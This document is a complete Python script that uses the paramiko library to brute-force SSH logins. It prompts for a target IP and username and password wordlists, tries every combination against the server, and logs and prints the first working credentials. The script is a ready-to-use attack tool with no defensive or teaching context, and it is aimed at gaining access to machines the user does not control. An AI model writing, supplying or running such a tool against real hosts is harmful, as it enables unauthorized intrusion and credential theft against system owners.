import paramiko
import logging

# Configure logging
logging.basicConfig(filename="bruteforce.log", level=logging.INFO, format="%(asctime)s - %(message)s")

def ssh_brute_force(ip, username_list, password_list):
    """Perform brute-force attack to find valid SSH credentials."""
    for username in username_list:
        for password in password_list:
            try:
                print(f"Trying username: {username}, password: {password}")
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, username=username, password=password, timeout=3)
                
                print(f"[+] Success! Username: {username}, Password: {password}")
                logging.info(f"Valid credentials found - Username: {username}, Password: {password}")
                client.close()
                return username, password
            except paramiko.AuthenticationException:
                # Authentication failed, try next
                logging.warning(f"Failed attempt - Username: {username}, Password: {password}")
            except Exception as e:
                print(f"Error occurred: {e}")
                logging.error(f"Error occurred: {e}")
    print("[-] No valid credentials found.")
    return None, None

if __name__ == "__main__":
    target_ip = input("Enter the target IP: ")
    username_file = input("Enter the path to the username file: ")
    password_file = input("Enter the path to the password file: ")

    # Load usernames and passwords from files
    with open(username_file, "r") as uf:
        usernames = [line.strip() for line in uf.readlines()]
    with open(password_file, "r") as pf:
        passwords = [line.strip() for line in pf.readlines()]

    # Start brute force
    valid_username, valid_password = ssh_brute_force(target_ip, usernames, passwords)

    if valid_username and valid_password:
        print(f"[+] Valid credentials found: {valid_username}:{valid_password}")
    else:
        print("[-] No valid credentials found. Check logs for details.")
